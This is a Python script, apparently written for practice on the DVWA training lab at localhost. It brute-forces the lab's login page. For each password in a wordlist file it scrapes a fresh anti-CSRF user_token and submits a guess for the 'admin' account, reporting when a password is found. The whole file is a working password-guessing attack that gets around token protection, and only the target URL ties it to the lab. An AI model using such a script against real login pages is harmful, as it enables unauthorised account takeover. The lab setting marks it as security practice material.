import threading
import requests

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

cookies = {
    'security':'high' ,
    'PHPSESSID':'njos0jhhcj197l8dj3d9bs08co'
}

password = "pass"
passFilePath = "passwords.txt"
passFile = open(passFilePath)

for password in passFile.readlines() :
    password = password.strip('\n')
    page_url = f'http://localhost/DVWA/vulnerabilities/brute/'
    page = requests.get(url=page_url,cookies=cookies)

    parts = page.text.split("user_token")[1]
    parts = parts.split("value=")[1]
    token = parts.split()[0][1:].strip('\'')

    url = f'http://localhost/DVWA/vulnerabilities/brute/index.php?username=admin&password={password}&Login=Login&user_token={token}'

    response = requests.get(url=url,cookies=cookies)

    print(f'[+] Trying : {url}')

    if not "incorrect" in response.text :
        print(f"{bcolors.OKGREEN}[+] Password Found {password}{bcolors.ENDC}")
    else :
        print(f"[-] Failed with {password}")
        # print(response.text)

        # exit(0)